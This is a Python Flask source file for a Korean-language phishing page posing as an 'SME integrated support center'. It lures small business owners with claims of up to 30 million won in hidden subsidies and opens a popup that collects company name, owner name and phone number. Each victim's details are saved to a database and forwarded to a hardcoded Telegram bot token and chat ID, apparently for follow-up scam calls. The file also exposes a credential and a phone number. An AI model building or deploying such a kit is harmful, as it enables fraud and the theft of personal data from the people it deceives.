import os
import requests
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
basedir = os.path.abspath(os.path.dirname(__file__))

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'SME_MASTER_FINAL.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

TELEGRAM_TOKEN = "8697049954:AAEHNS-BqSTgdZ-yHEDtBa7Ic_Myntc6gH4"
CHAT_ID = "7013080778"

class BusinessLead(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    biz_name = db.Column(db.String(100))
    owner_name = db.Column(db.String(50))
    phone = db.Column(db.String(20), unique=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

def fishing_bot():
    while True:
        time.sleep(3600)

HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SME 통합지원센터</title>

<style>
body{background:#0f172a;color:white;font-family:sans-serif;margin:0}
.card{background:#1e293b;padding:25px;border-radius:20px;width:90%;max-width:400px;margin:auto;margin-top:80px}
input{width:100%;padding:15px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:white;border-radius:10px}
button{background:#fbbf24;padding:18px;width:100%;font-weight:bold;border:none;border-radius:12px;font-size:18px}
</style>
</head>

<body>

<div style="text-align:center;margin-top:100px;">
<h2>🔥 숨은 지원금 최대 3,000만원 확인</h2>
<p>1분만에 내 회사 환급금 조회</p>
<button onclick="openPopup()">내 지원금 확인하기</button>
</div>

<div id="popup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);">

<div class="card">
<h3>SME 통합지원센터</h3>

<input id="biz" placeholder="회사명">
<input id="owner" placeholder="대표자">
<input id="phone" placeholder="전화번호">

<button onclick="submitLead()">무료 분석 신청</button>

<a href="tel:01098091609" style="display:block;background:#22c55e;padding:15px;margin-top:10px;text-align:center;border-radius:10px;">
📞 바로 상담하기
</a>

<button onclick="closePopup()" style="margin-top:10px;background:#334155;">닫기</button>

</div>
</div>

<script>

window.onload = function(){
setTimeout(()=>openPopup(),1000);
}

function openPopup(){
document.getElementById('popup').style.display='block';
}

function closePopup(){
document.getElementById('popup').style.display='none';
}

async function submitLead(){
const data={
biz:biz.value,
owner:owner.value,
phone:phone.value
}

await fetch('/api/v1/submit',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(data)
})

alert("신청 완료")
closePopup()
}

</script>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/api/v1/submit', methods=['POST'])
def submit():
    data = request.json

    new = BusinessLead(
        biz_name=data['biz'],
        owner_name=data['owner'],
        phone=data['phone']
    )
    db.session.add(new)
    db.session.commit()

    msg = f"🚨 신규 DB\n{data['biz']} / {data['phone']}"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                  json={"chat_id": CHAT_ID, "text": msg})

    return jsonify({"ok": True})

if __name__ == '__main__':
    threading.Thread(target=fishing_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
